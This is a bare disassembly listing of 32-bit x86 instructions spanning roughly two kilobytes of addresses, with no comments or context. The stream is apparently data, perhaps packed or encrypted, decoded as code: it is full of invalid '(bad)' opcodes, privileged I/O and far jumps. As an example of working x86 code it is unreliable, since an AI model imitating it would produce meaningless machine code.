  4166a5:	inc    edx
  4166a6:	xchg   BYTE PTR [ebx+0x66],dl
  4166a9:	lods   eax,DWORD PTR ds:[esi]
  4166aa:	int3   
  4166ab:	add    ch,BYTE PTR [ecx-0x1f3e8357]
  4166b1:	mov    al,0xc2
  4166b3:	jge    0x4166ce
  4166b5:	(bad)  
  4166b6:	pop    ebx
  4166b7:	pop    ds
  4166b8:	imul   edx,DWORD PTR gs:[ebp-0x7cc7e56b],0x43
  4166c0:	(bad)  
  4166c1:	jl     0x416686
  4166c3:	adc    DWORD PTR [edx],esp
  4166c5:	mov    al,0xc2
  4166c7:	mov    DWORD PTR [ebp-0x3acccbc1],ebp
  4166cd:	mov    ah,BYTE PTR [ebx+0x2a]
  4166d0:	mov    ch,0x2e
  4166d2:	int3   
  4166d3:	mov    dl,0x94
  4166d5:	popf   
  4166d6:	cmove  esp,DWORD PTR [ecx]
  4166d9:	mov    ah,0xf1
  4166db:	(bad)  
  4166dc:	mov    ds:0xcdbfb9de,eax
  4166e1:	inc    ebx
  4166e3:	shl    cl,cl
  4166e5:	(bad)  
  4166e6:	cld    
  4166e7:	into   
  4166e8:	adc    ah,BYTE PTR [edi+0x17c2142]
  4166ee:	jne    0x41668f
  4166f0:	fstp   DWORD PTR [ecx+0x7d]
  4166f3:	pop    ebx
  4166f4:	mov    ebp,DWORD PTR [edi]
  4166f6:	cdq    
  4166f7:	mov    dh,0xd
  4166f9:	xor    DWORD PTR [edx],esi
  4166fb:	and    edx,esi
  4166fd:	or     ecx,esp
  4166ff:	inc    eax
  416700:	xchg   ebp,eax
  416701:	call   esi
  416703:	jne    0x4166e4
  416705:	mov    ebp,0x549cf1b0
  41670a:	jae    0x4166e7
  41670c:	popa   
  41670d:	fisttp WORD PTR [edx+0xa]
  416710:	dec    esi
  416711:	add    ebp,DWORD PTR [edx]
  416713:	adc    eax,0x4f00a137
  416718:	adc    bl,BYTE PTR [esi]
  41671a:	lock je 0x4166c4
  41671d:	rcl    DWORD PTR [edi*4+0x77effae0],0x8a
  416725:	xchg   ecx,eax
  416726:	sbb    eax,0xbb8e6595
  41672b:	xchg   ecx,eax
  41672c:	shr    BYTE PTR [ecx-0x21],1
  41672f:	inc    edi
  416730:	jbe    0x4166c8
  416732:	fmul   DWORD PTR [ebx+eiz*4+0x6]
  416736:	pop    ebp
  416737:	mov    ebp,0xfca8da50
  41673c:	shl    DWORD PTR [edx+0x1f],1
  41673f:	jb     0x41673b
  416741:	popa   
  416742:	inc    edx
  416743:	ficom  WORD PTR [eax-0xc]
  416746:	sub    BYTE PTR [eax-0x318aac15],dl
  41674c:	push   ebp
  41674d:	loop   0x41678b
  41674f:	jg     0x4167c7
  416751:	bound  edx,QWORD PTR [esp+edi*1]
  416754:	jg     0x41675c
  416756:	xor    DWORD PTR [eax+0x42],esp
  416759:	push   edx
  41675a:	dec    esi
  41675b:	or     bl,bl
  41675d:	inc    ebp
  41675e:	iret   
  41675f:	test   al,0x21
  416761:	sub    esp,edi
  416763:	mov    ebp,DWORD PTR [eax-0x255055d0]
  416769:	sti    
  41676a:	loop   0x416734
  41676c:	inc    ebp
  41676d:	cdq    
  41676e:	dec    ebp
  41676f:	mov    fs,edi
  416771:	mov    bl,0x39
  416773:	adc    eax,0x1b170959
  416778:	pop    ds
  416779:	inc    eax
  41677a:	out    dx,al
  41677b:	pop    ebp
  41677c:	loopne 0x4167f9
  41677e:	mov    al,0xad
  416780:	adc    bh,dh
  416782:	lahf   
  416783:	dec    ebp
  416784:	(bad)  
  416785:	sub    DWORD PTR [ebx+0x76d0aa1f],0xbb12ba15
  41678f:	sbb    bh,ah
  416791:	and    eax,0x531b2fdf
  416796:	jge    0x4167f4
  416798:	in     al,0xcb
  41679a:	ins    DWORD PTR es:[edi],dx
  41679b:	aad    0xd2
  41679d:	adc    ebx,esp
  41679f:	or     bl,BYTE PTR [ebx+0x7e]
  4167a2:	xor    cl,dl
  4167a4:	or     eax,0x68519298
  4167a9:	leave  
  4167aa:	sbb    ah,BYTE PTR [ebp+ebx*1-0x5d82ab71]
  4167b1:	xor    DWORD PTR [eax-0x6381e61],ebp
  4167b7:	jnp    0x416757
  4167b9:	fs dec esp
  4167bb:	test   DWORD PTR [ecx-0x6309ad75],0x257c3792
  4167c5:	scas   al,BYTE PTR es:[edi]
  4167c6:	pop    es
  4167c7:	or     DWORD PTR [edi+0x3f],esi
  4167ca:	popa   
  4167cb:	dec    ebx
  4167cc:	arpl   WORD PTR [edx],cx
  4167ce:	push   0xffffffab
  4167d0:	mov    ch,0x1b
  4167d2:	and    ecx,edx
  4167d4:	dec    esp
  4167d5:	jmp    0xfc89:0xe930eefb
  4167dc:	add    bh,ch
  4167de:	dec    edi
  4167df:	dec    ebp
  4167e0:	fcmovbe st,st(0)
  4167e2:	aam    0x12
  4167e4:	push   ebx
  4167e5:	lods   al,BYTE PTR ds:[esi]
  4167e6:	jns    0x4167de
  4167e8:	sbb    eax,edi
  4167ea:	test   eax,0x2e6297ed
  4167ef:	add    ebx,DWORD PTR [edx+ebp*2-0x55]
  4167f3:	add    eax,0xe6b84ec5
  4167f8:	iret   
  4167f9:	adc    esi,edx
  4167fb:	cmp    eax,DWORD PTR [edi+0x6d]
  4167fe:	test   dh,dh
  416800:	sar    BYTE PTR [edi+0x2d],1
  416803:	cld    
  416804:	xor    esp,esi
  416806:	adc    BYTE PTR [eax],al
  416808:	retf   
  416809:	sbb    al,0x94
  41680b:	or     BYTE PTR [edx+esi*4],dh
  41680e:	and    BYTE PTR [eax+edi*1+0x6865b00b],ah
  416815:	rol    DWORD PTR [edi-0x5c6e6cb8],0x98
  41681c:	data16 and al,bh
  41681f:	cmp    al,0x5f
  416821:	push   0xbedb1169
  416826:	push   eax
  416827:	clc    
  416828:	cs push esp
  41682a:	xor    BYTE PTR [ebp-0x61da0c2f],dl
  416830:	mov    bl,0x6f
  416832:	loop   0x41681c
  416834:	test   eax,0x2586ecbc
  416839:	xlat   BYTE PTR ds:[ebx]
  41683a:	sub    al,0x4c
  41683c:	mov    bh,BYTE PTR [edi+0x35]
  41683f:	mov    al,0x8
  416841:	and    al,0xf3
  416843:	lds    ebx,FWORD PTR [ebp+0x6bcd9c25]
  416849:	dec    edi
  41684a:	or     ebx,edx
  41684c:	cdq    
  41684d:	jb     0x4168ad
  41684f:	push   eax
  416850:	dec    ecx
  416851:	rol    BYTE PTR [eax+0xd],cl
  416854:	inc    eax
  416855:	call   0x81fa:0x7a5d8321
  41685c:	mov    bh,0x2c
  41685e:	test   edx,ecx
  416860:	ret    
  416861:	fninit 
  416863:	xor    al,0x7f
  416865:	(bad)  
  416866:	mov    ecx,0x36a48fe5
  41686b:	sub    DWORD PTR [ebx+0x6cff70c4],edx
  416871:	lods   al,BYTE PTR ds:[esi]
  416872:	mov    edi,0xe6dda55c
  416877:	es cmp ebp,ebp
  41687a:	adc    al,BYTE PTR [edx]
  41687c:	push   0xffffffd4
  41687e:	cmp    esp,0x612ad854
  416884:	xlat   BYTE PTR ds:[ebx]
  416885:	scas   eax,DWORD PTR es:[edi]
  416886:	inc    bp
  416888:	xor    eax,0xce9fb609
  41688d:	btc    DWORD PTR [ecx+edx*4],ecx
  416891:	pop    eax
  416892:	shl    BYTE PTR [edi-0x9],1
  416895:	test   DWORD PTR [esi-0x6f3c4b10],edx
  41689b:	cmp    DWORD PTR [eax],edi
  41689d:	out    dx,al
  41689e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41689f:	adc    cl,al
  4168a1:	mov    al,0x45
  4168a3:	sahf   
  4168a4:	and    BYTE PTR ds:0x30005055,bh
  4168aa:	retf   
  4168ab:	cld    
  4168ac:	mov    ss,WORD PTR ds:0x591bd689
  4168b2:	add    esi,DWORD PTR [edx+0x3e]
  4168b5:	fisttp WORD PTR [edx+0x4412176f]
  4168bb:	adc    esi,DWORD PTR [edx+0x30]
  4168be:	lea    ebp,[ecx-0x2cb5d7be]
  4168c4:	xchg   ebp,eax
  4168c5:	dec    ecx
  4168c6:	test   eax,0xbc45e9c5
  4168cb:	jb     0x4168b5
  4168cd:	sbb    al,0x2b
  4168cf:	loope  0x41692b
  4168d1:	jmp    0x416863
  4168d3:	pop    ebx
  4168d4:	and    eax,0x47b5eaea
  4168d9:	pop    esi
  4168da:	or     DWORD PTR [eax+0x37],eax
  4168dd:	xor    DWORD PTR [ebx],ebp
  4168df:	imul   edi,DWORD PTR [edi-0x3d0ee512],0xfffffff5
  4168e6:	neg    BYTE PTR ds:0x962ad3a3
  4168ec:	js     0x4168ba
  4168ee:	mov    ah,0xa0
  4168f0:	cmp    ecx,ebp
  4168f2:	cdq    
  4168f3:	and    al,0xda
  4168f5:	inc    bh
  4168f7:	push   ds
  4168f8:	rcl    DWORD PTR [edi],cl
  4168fa:	cmc    
  4168fb:	or     DWORD PTR [eax+0x7a97f108],0xc0a5b7d5
  416905:	mov    ecx,0x947e6e6f
  41690a:	pop    ecx
  41690b:	(bad)  
  41690c:	push   ds
  41690d:	bound  ebx,QWORD PTR [ebx]
  41690f:	cmp    eax,0x97690792
  416914:	xor    BYTE PTR [edi+0x5c],ch
  416917:	push   ebp
  416918:	mov    ah,0xeb
  41691a:	nop
  41691b:	vmread esp,ebp
  41691e:	test   eax,0x3c86ecad
  416923:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416924:	jo     0x416905
  416926:	cmc    
  416927:	push   ecx
  416928:	mov    BYTE PTR [ebx],dl
  41692a:	imul   ecx,DWORD PTR [esi-0x55d88ba],0x18c4ef95
  416934:	fld    TBYTE PTR [ebx+ecx*2]
  416937:	aaa    
  416938:	sub    edi,DWORD PTR [edi+0x1c791fea]
  41693e:	js     0x41699a
  416940:	in     al,dx
  416941:	sbb    eax,0xa052cc09
  416946:	jg     0x4168f8
  416948:	leave  
  416949:	jmp    0xf8c7:0x11bb95f4
  416950:	sub    ebx,DWORD PTR [ecx]
  416952:	rol    BYTE PTR [edx+0x7e],cl
  416955:	xchg   ebp,eax
  416956:	xchg   edi,eax
  416957:	pop    edx
  416958:	aaa    
  416959:	or     BYTE PTR [ebp-0x1d7ec966],bl
  41695f:	or     esp,DWORD PTR [ebx]
  416961:	sbb    dh,ah
  416963:	in     al,dx
  416964:	xchg   BYTE PTR [esi],ah
  416966:	sbb    esi,edi
  416968:	and    DWORD PTR [edi+0x24f740b1],ecx
  41696e:	add    eax,0xdb22925d
  416973:	add    eax,0xb4bc576
  416978:	mov    DWORD PTR [eax+0x27],0x782782c2
  41697f:	or     DWORD PTR [ebx+ecx*4],esi
  416982:	add    esi,DWORD PTR [eax]
  416984:	mov    eax,ds:0x49ed3dde
  416989:	test   DWORD PTR [eax+0xd],0xb34cb66
  416990:	push   edx
  416991:	aad    0x5a
  416993:	mov    ebx,0xe7e7803d
  416998:	leave  
  416999:	inc    esp
  41699a:	std    
  41699b:	arpl   bp,sp
  41699d:	(bad)  
  41699e:	jg     0x41695d
  4169a0:	out    0x22,al
  4169a2:	cwde   
  4169a3:	mov    ecx,0x5e1b382b
  4169a8:	fnstcw WORD PTR [eax]
  4169aa:	adc    DWORD PTR [edx+0x7d2135b5],ebp
  4169b0:	in     eax,0xca
  4169b2:	mov    ch,0xcf
  4169b4:	leave  
  4169b5:	mov    dh,0xa8
  4169b7:	xor    DWORD PTR [ebp+0x6a93f135],esi
  4169bd:	leave  
  4169be:	mov    al,0xd
  4169c0:	mov    ah,0x57
  4169c2:	adc    edx,esi
  4169c4:	vpsubusb ymm3,ymm7,YMMWORD PTR [ebx]
  4169c9:	je     0x416970
  4169cb:	mov    edi,0x23e830e8
  4169d0:	inc    edx
  4169d1:	dec    eax
  4169d2:	retf   
  4169d3:	push   edi
  4169d4:	push   eax
  4169d5:	add    ebx,DWORD PTR [edx-0x7277c903]
  4169db:	cs jns 0x4169e5
  4169de:	or     dh,BYTE PTR [ebp-0x61]
  4169e1:	sbb    dh,ah
  4169e3:	pop    es
  4169e4:	xor    eax,0xba307c1
  4169e9:	cwde   
  4169ea:	out    0x71,al
  4169ec:	xchg   edx,eax
  4169ed:	popf   
  4169ee:	out    dx,eax
  4169ef:	cli    
  4169f0:	mov    bh,0x7f
  4169f2:	push   ebp
  4169f3:	mov    ah,0x56
  4169f5:	or     al,BYTE PTR [edi-0x3]
  4169f8:	retf   0x6cbc
  4169fb:	les    esi,FWORD PTR [edi]
  4169fd:	scas   al,BYTE PTR es:[edi]
  4169fe:	mov    eax,ds:0xd0948bfa
  416a03:	or     bh,BYTE PTR [eax+0x2f]
  416a06:	je     0x4169be
  416a08:	cmp    BYTE PTR cs:[esi+0x761a123f],ah
  416a0f:	jns    0x4169d3
  416a11:	(bad)  
  416a12:	fst    DWORD PTR [esi-0x35ae1d4f]
  416a18:	xchg   esi,eax
  416a19:	sar    cl,0xe4
  416a1c:	pop    ebp
  416a1d:	scas   eax,DWORD PTR es:[edi]
  416a1e:	cli    
  416a1f:	push   edx
  416a20:	xchg   esi,eax
  416a21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a22:	test   BYTE PTR [esi+0xafcb05e],al
  416a28:	push   es
  416a29:	jno    0x416a76
  416a2b:	push   ebp
  416a2c:	std    
  416a2d:	mov    al,ds:0x386c3ea7
  416a32:	je     0x4169ff
  416a34:	mov    eax,gs
  416a36:	cmc    
  416a37:	adc    eax,0x2c365c58
  416a3c:	imul   ecx,DWORD PTR [ecx-0x50],0x633f09c9
  416a43:	pop    ebp
  416a44:	in     al,dx
  416a45:	ror    edi,1
  416a47:	mov    ds:0x77ee18a7,al
  416a4c:	rcr    DWORD PTR [eax+0x273e391f],1
  416a52:	cmp    eax,DWORD PTR [esi-0x7cf47f85]
  416a58:	mov    dl,0x43
  416a5a:	in     al,0x7
  416a5c:	retf   
  416a5d:	jmp    0x797d:0x15080d5
  416a64:	add    BYTE PTR [eax+0x47256429],al
  416a6a:	or     ch,cl
  416a6c:	add    BYTE PTR [eax+0x21010377],0xd9
  416a73:	sbb    ebx,DWORD PTR ds:0xf00231d6
  416a79:	and    al,0x72
  416a7b:	mov    ds:0x642b267d,al
  416a80:	jo     0x416acc
  416a82:	and    eax,0xed533424
  416a87:	imul   eax,DWORD PTR [eax],0x5e
  416a8a:	dec    edx
  416a8b:	xchg   ebx,eax
  416a8c:	xor    cl,BYTE PTR [ecx-0x79701e96]
  416a92:	add    esi,0xffffffb6
  416a95:	out    0x3c,al
  416a97:	in     al,0x72
  416a99:	add    al,0xf2
  416a9b:	(bad)  
  416a9c:	repz mov dh,0x51
  416a9f:	mov    ebx,0x2a03c863
  416aa4:	mov    ds:0xd077d6fd,eax
  416aa9:	dec    edi
  416aaa:	dec    esp
  416aab:	lea    ebx,[ebx-0x61]
  416aae:	sbb    edi,DWORD PTR [esi]
  416ab0:	ds iret 
  416ab2:	jno    0x416b1e
  416ab4:	mov    ch,0x55
  416ab6:	sbb    BYTE PTR [ecx],ch
  416ab8:	cmp    BYTE PTR ds:0xed237dd8,dh
  416abe:	jae    0x416b30
  416ac0:	or     BYTE PTR [edx-0x5d2df67d],ah
  416ac6:	xor    eax,0xb8416923
  416acb:	push   edi
  416acc:	test   DWORD PTR [esi-0x9],edx
  416acf:	into   
  416ad0:	(bad)  
  416ad1:	aad    0xad
  416ad3:	adc    ecx,DWORD PTR ds:0x49d2090a
  416ad9:	test   eax,0x769f9a78
  416ade:	add    DWORD PTR [edi+0x67],0xffffffb5
  416ae2:	stos   DWORD PTR es:[edi],eax
  416ae3:	stos   DWORD PTR es:[edi],eax
  416ae4:	mov    bh,0x97
  416ae6:	add    DWORD PTR [esi],0x547cb000
  416aec:	(bad)  
  416aed:	jno    0x416b35
  416aef:	(bad)  
  416af0:	ins    DWORD PTR es:[edi],dx
  416af1:	loopne 0x416ad2
  416af3:	sbb    BYTE PTR [edx],0xc0
  416af6:	loope  0x416ae3
  416af8:	mov    esi,esi
  416afa:	jecxz  0x416b71
  416afc:	in     eax,0x5d
  416afe:	mov    edi,DWORD PTR [ebp-0x66]
  416b01:	rcr    BYTE PTR [ebx],0xc1
  416b04:	sub    BYTE PTR [eax-0x69386e3c],dh
  416b0a:	aas    
  416b0b:	das    
  416b0c:	cmp    al,0xc5
  416b0e:	and    dl,BYTE PTR [esi]
  416b10:	mov    al,ds:0x4329fa65
  416b15:	pop    esi
  416b16:	mov    bl,BYTE PTR [esi+0x3ce05b59]
  416b1c:	int    0xc2
  416b1e:	sub    edi,DWORD PTR [ecx+0x19]
  416b21:	loopne 0x416b0c
  416b23:	push   edx
  416b24:	mov    dh,0xbb
  416b26:	shl    BYTE PTR [ecx],cl
  416b28:	cli    
  416b29:	retf   0x1791
  416b2c:	mov    BYTE PTR [ebx+0x19],bl
  416b2f:	push   esi
  416b30:	aam    0x1b
  416b32:	jmp    0x83f74aad
  416b37:	jne    0x416b56
  416b39:	xchg   DWORD PTR [edi-0x7a73ec1d],edi
  416b3f:	(bad)  [edi+0x2a22e8a2]
  416b45:	inc    ecx
  416b46:	cmp    BYTE PTR [edi-0x5723fa3b],dh
  416b4c:	lods   eax,DWORD PTR ds:[esi]
  416b4d:	lea    esp,[ecx]
  416b4f:	mov    bl,0xb3
  416b51:	xchg   ebx,eax
  416b52:	outs   dx,BYTE PTR ds:[esi]
  416b53:	sub    edi,DWORD PTR [ebx+0x16]
  416b56:	cmp    al,0x6a
  416b58:	add    bh,0xd4
  416b5b:	lahf   
  416b5c:	mov    ecx,0xf0253d5c
  416b61:	lahf   
  416b62:	or     DWORD PTR [ecx+0x2a9b3e19],edi
  416b68:	push   ds
  416b69:	sub    edi,DWORD PTR [ebp+0x68829bea]
  416b6f:	push   ecx
  416b70:	ficomp DWORD PTR [eax+0x6c]
  416b73:	ins    DWORD PTR es:[edi],dx
  416b74:	add    bl,BYTE PTR [ebx]
  416b76:	mov    esi,0xd11548fd
  416b7b:	pop    ecx
  416b7c:	movq   mm7,QWORD PTR [esi-0x34eb0af2]
  416b83:	ret    0xd5f4
  416b86:	cmp    BYTE PTR ds:0x774c322b,dh
  416b8c:	mov    WORD PTR [edx+0x42cb9f97],es
  416b92:	mov    esi,0x5f3d04b4
  416b97:	ret    0x2801
  416b9a:	cmc    
  416b9b:	xchg   edx,eax
  416b9c:	dec    eax
  416b9d:	push   esi
  416b9e:	sub    edi,DWORD PTR [edi+0x418f54b3]
  416ba4:	das    
  416ba5:	mov    bl,0x88
  416ba7:	jo     0x416bae
  416ba9:	pop    esi
  416baa:	cmc    
  416bab:	clc    
  416bac:	inc    eax
  416bad:	add    al,0x9
  416baf:	es out 0xf2,eax
  416bb2:	mov    bl,bh
  416bb4:	aad    0x4e
  416bb6:	jae    0x416c1a
  416bb8:	sbb    DWORD PTR [ecx+0x1a],0x3d8a695c
  416bbf:	aad    0xf1
  416bc1:	clc    
  416bc2:	out    dx,al
  416bc3:	jb     0x416b70
  416bc5:	lock push ss
  416bc7:	mov    cl,0x17
  416bc9:	test   eax,0xdfa79adf
  416bce:	sahf   
  416bcf:	sbb    esp,edx
  416bd1:	sar    DWORD PTR [ecx],cl
  416bd3:	mov    db5,eax
  416bd6:	inc    edx
  416bd7:	jo     0x416bf0
  416bd9:	or     esp,DWORD PTR [esi-0x7]
  416bdc:	cld    
  416bdd:	ds popf 
  416bdf:	ja     0x416ba9
  416be1:	lahf   
  416be2:	or     BYTE PTR [edi+0x1a7f6c25],bh
  416be8:	mov    dl,0xec
  416bea:	pop    ss
  416beb:	pop    esi
  416bec:	repnz imul ebx,DWORD PTR [edx+0x31],0x5f
  416bf1:	sub    eax,0x6ebff545
  416bf6:	add    al,0x1e
  416bf8:	fst    DWORD PTR [eax+0x76111e57]
  416bfe:	ins    DWORD PTR es:[edi],dx
  416bff:	adc    ecx,DWORD PTR [esi+edi*2+0x75de91e]
  416c06:	xchg   esp,eax
  416c07:	jge    0x416c80
  416c09:	mov    ebx,0xbf2e8ca1
  416c0e:	add    cl,bh
  416c10:	dec    esp
  416c11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c12:	sbb    eax,0x81e815b3
  416c17:	mov    eax,ds:0x8f698d85
  416c1c:	retf   
  416c1d:	cmp    eax,0x73ef1bb1
  416c23:	cmp    eax,0x24187cbc
  416c28:	fst    QWORD PTR [esi+edi*1]
  416c2b:	(bad)  
  416c2c:	retf   0xbcfa
  416c2f:	ror    DWORD PTR [ecx+0x689bf58],0x87
  416c36:	mov    esi,?
  416c38:	add    al,0x35
  416c3a:	jmp    0x416c63
  416c3c:	mov    ah,BYTE PTR [edx+0x224b91f1]
  416c42:	outs   dx,BYTE PTR ds:[esi]
  416c43:	xchg   BYTE PTR [ebx-0x22],al
  416c46:	js     0x416c3f
  416c48:	dec    ebx
  416c49:	out    0xb8,al
  416c4b:	push   edx
  416c4c:	ret    
  416c4d:	popa   
  416c4e:	std    
  416c4f:	adc    DWORD PTR [edi+ebx*8-0x716208dd],ebp
  416c56:	pushf  
  416c57:	add    DWORD PTR [esi+0x79],esi
  416c5a:	sbb    al,0x5c
  416c5c:	xlat   BYTE PTR ds:[ebx]
  416c5d:	std    
  416c5e:	fstp   QWORD PTR [esi-0x47b98e2a]
  416c64:	scas   al,BYTE PTR es:[edi]
  416c65:	addr16 sub al,dh
  416c68:	push   edx
  416c69:	dec    ecx
  416c6a:	clc    
  416c6b:	popa   
  416c6c:	cmp    al,0x8e
  416c6e:	jp     0x416ce0
  416c70:	fmul   DWORD PTR [edi]
  416c72:	xchg   esi,eax
  416c73:	cld    
  416c74:	(bad)  
  416c75:	pushf  
  416c76:	lea    ebx,es:[edx-0x7988276f]
  416c7d:	fld    DWORD PTR [edi-0x75]
  416c80:	mov    al,0x23
  416c82:	jno    0x416cb9
  416c84:	or     ebx,esp
  416c86:	nop
  416c87:	pop    ss
  416c88:	scas   eax,DWORD PTR es:[edi]
  416c89:	xchg   ecx,eax
  416c8a:	je     0x416cfe
  416c8c:	adc    eax,0xf7361426
  416c91:	inc    ebp
  416c92:	and    DWORD PTR [ecx-0x1a],esi
  416c95:	gs inc ecx
  416c97:	ror    DWORD PTR [ebp-0x6d],cl
  416c9a:	pop    esp
  416c9b:	jbe    0x416ccd
  416c9d:	in     eax,0xe7
  416c9f:	jns    0x416c8b
  416ca1:	inc    ebx
  416ca2:	in     al,dx
  416ca3:	mov    ds:0xf0f82dad,eax
  416ca8:	sub    DWORD PTR [ebx],eax
  416caa:	push   0x58
  416cac:	rcr    DWORD PTR [ecx+0x2d53c2e8],0xc7
  416cb3:	sbb    bl,bl
  416cb5:	cmp    ch,dl
  416cb7:	xor    ah,BYTE PTR [esi+ecx*2+0x24]
  416cbb:	and    DWORD PTR [edi+ebx*4+0x1d],esi
  416cbf:	pop    ebx
  416cc0:	idiv   DWORD PTR [esi+0x44395243]
  416cc6:	sbb    al,0xe
  416cc8:	mov    edx,0xa0b168f3
  416ccd:	xor    BYTE PTR [esi],al
  416ccf:	cmp    DWORD PTR [eax+0x4f],edi
  416cd2:	(bad)  
  416cd3:	mov    edx,0xbb0f5f3
  416cd8:	xchg   DWORD PTR [esi-0x4c],esp
  416cdb:	retf   0xf3c0
  416cde:	fs aad 0x3
  416ce1:	test   esi,esp
  416ce3:	scas   eax,DWORD PTR es:[edi]
  416ce4:	loope  0x416c9b
  416ce6:	jmp    0x7382:0x2a893cfe
  416ced:	xchg   edx,eax
  416cee:	mov    WORD PTR [ebp+0x2c7af957],es
  416cf4:	xchg   esi,eax
  416cf5:	cmp    cl,BYTE PTR [eax+0xe]
  416cf8:	setbe  BYTE PTR [edi]
  416cfb:	dec    edx
  416cfc:	sub    esp,edx
  416cfe:	jl     0x416cda
  416d00:	stos   DWORD PTR es:[edi],eax
  416d01:	test   eax,0x3d502466
  416d06:	lods   al,BYTE PTR ds:[esi]
  416d07:	mov    ds:0x63fc2586,al
  416d0c:	sar    DWORD PTR [esi-0xacb0b15],cl
  416d12:	pop    ebp
  416d13:	lea    ebx,[edi+0x5a]
  416d16:	push   esp
  416d17:	mov    ?,WORD PTR [bx+di+0x6d59]
  416d1c:	stos   BYTE PTR es:[edi],al
  416d1d:	xor    eax,0x2f6b5117
  416d22:	cmp    BYTE PTR [eax],dh
  416d24:	idiv   ah
  416d26:	fist   WORD PTR [edi+0x7e]
  416d29:	mov    cl,bl
  416d2b:	dec    eax
  416d2c:	mov    ds:0x4b159602,al
  416d31:	int3   
  416d32:	push   ebp
  416d33:	loope  0x416d9f
  416d35:	and    eax,0x646dbe2c
  416d3a:	mov    cl,0x2f
  416d3c:	sub    esp,ebx
  416d3e:	and    DWORD PTR [esi+0x3b725ecb],ebp
  416d44:	fsub   QWORD PTR [esi+esi*2]
  416d47:	mov    al,0xed
  416d49:	xchg   BYTE PTR [ecx-0x31],al
  416d4c:	mov    ah,0x62
  416d4e:	mov    bl,0xcc
  416d50:	popa   
  416d51:	arpl   WORD PTR ds:0xaa005b9c,di
  416d57:	pop    esp
  416d58:	inc    eax
  416d59:	pop    ebp
  416d5a:	test   al,0x15
  416d5c:	sub    BYTE PTR [esi+ecx*2],bl
  416d5f:	fcomi  st,st(5)
  416d61:	xchg   ebx,eax
  416d62:	xchg   edx,eax
  416d63:	mov    esi,0x591510fa
  416d68:	ins    DWORD PTR es:[edi],dx
  416d69:	xchg   esp,eax
  416d6a:	sti    
  416d6b:	mov    es,WORD PTR [ebp+0x4e]
  416d6e:	call   0x6342:0x14d69ca1
  416d75:	cli    
  416d76:	push   eax
  416d77:	pop    ss
  416d78:	mov    ah,0xff
  416d7a:	xchg   DWORD PTR [edx+eiz*4+0x4687e11e],edi
  416d81:	es sub eax,0x79f4581f
  416d87:	add    eax,DWORD PTR [eax+0x5b06b58]
  416d8d:	sbb    dh,BYTE PTR [esi+ecx*2]
  416d90:	sub    DWORD PTR [edi+0x79f1e167],0x3e92f99a
  416d9a:	das    
  416d9b:	or     DWORD PTR [edi+ebx*1+0x6f7abe57],0x3bbd84f7
  416da6:	in     eax,dx
  416da7:	rol    DWORD PTR [ecx+0x1e],cl
  416daa:	ja     0x416de9
  416dac:	dec    edi
  416dad:	cs push cs
  416daf:	test   al,0xcd
  416db1:	inc    eax
  416db2:	mov    ds:0x555c233c,eax
  416db7:	xchg   edx,eax
  416db8:	test   al,0xca
  416dba:	adc    eax,0xde44932f
  416dbf:	inc    esp
  416dc0:	or     dh,BYTE PTR [eax+0x682e29e7]
  416dc6:	(bad)  [ecx+0x4a7cdd7f]
  416dcc:	enter  0xd321,0x47
  416dd0:	sbb    BYTE PTR [esi+0x0],bh
  416dd3:	ret    0x1267
  416dd6:	aaa    
  416dd7:	js     0x416e50
  416dd9:	sbb    eax,0x46638bdc
  416dde:	push   cs
  416ddf:	xor    BYTE PTR [ecx],bl
  416de1:	jg     0x416e02
  416de3:	xchg   ebx,eax
  416de4:	(bad)  
  416de5:	outs   dx,DWORD PTR ds:[esi]
  416de6:	out    0xec,eax
  416de8:	dec    ebp
  416de9:	(bad)  [esi-0xd]
  416dec:	pop    ebp
  416ded:	dec    eax
  416dee:	(bad)  
  416def:	pop    ss
  416df0:	shl    ebx,1
  416df2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416df3:	and    DWORD PTR [ecx-0x13],ebx
  416df6:	pushf  
  416df7:	inc    ebp
  416df8:	xchg   DWORD PTR [ebx],ebp
  416dfa:	cld    
  416dfb:	cmp    esp,0x97665ec7
  416e01:	mov    cl,0x4e
  416e03:	mov    bh,0x4b
  416e05:	lea    esi,[ebx+0x146a282]
  416e0b:	or     al,0xfc
  416e0d:	nop
  416e0e:	mov    al,ds:0x3ec85ae0
  416e13:	mov    cl,0x7d
  416e15:	adc    al,0x88
  416e17:	data16 ins BYTE PTR es:[edi],dx
  416e19:	xchg   edx,eax
  416e1a:	cld    
  416e1b:	test   DWORD PTR [eax-0x38],ebp
  416e1e:	stc    
  416e1f:	jne    0x416e09
  416e21:	call   0x72e2be43
  416e26:	inc    ebp
  416e27:	jo     0x416e38
  416e29:	mov    esi,DWORD PTR [esi]
  416e2b:	adc    DWORD PTR [eax+ebx*2-0x3aa6c505],esi
  416e32:	cs mov cl,0xc1
  416e35:	jg     0x416e71
  416e37:	and    eax,esp
  416e39:	in     al,0x99
  416e3b:	stos   DWORD PTR es:[edi],eax
  416e3c:	rol    DWORD PTR [ebx+0x5f],0xe0
  416e40:	mov    bh,0x51
  416e42:	iret   
  416e43:	dec    eax
  416e44:	hlt    
  416e45:	pop    esi
  416e46:	stos   DWORD PTR es:[edi],eax
  416e47:	shr    DWORD PTR [ebx+0x370cbf13],cl
  416e4d:	arpl   WORD PTR [ebx-0x44dfa562],dx
  416e53:	jmp    0x416e51
  416e55:	jle    0x416ebc
  416e57:	clc    
  416e58:	(bad)  
  416e59:	sti    
  416e5a:	repz or al,0xb7
  416e5d:	push   0xfffffff1
  416e5f:	aas    
  416e60:	arpl   WORD PTR [edi-0x6c392d8f],ax
  416e66:	retf   0x3ad2
  416e69:	sahf   
  416e6a:	(bad)  
  416e6b:	push   ss
  416e6c:	fs cli 
  416e6e:	fsubr  DWORD PTR [edi+eiz*8]
  416e71:	test   BYTE PTR [esi+0x156d52eb],dh
  416e77:	mov    edx,0x98eef45e
  416e7c:	pop    ds
  416e7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e7e:	pop    ebx
  416e7f:	push   ebx
  416e80:	outs   dx,BYTE PTR ds:[esi]
  416e81:	not    BYTE PTR [edx]
  416e83:	lods   al,BYTE PTR ds:[esi]
  416e84:	das    
  416e85:	dec    esi
  416e86:	hlt    
  416e87:	jecxz  0x416eef
  416e89:	mov    al,ds:0xca196bf7
  416e8e:	mov    dh,0x5
  416e90:	adc    edx,ecx
  416e92:	inc    DWORD PTR [esi-0x39e84ebf]
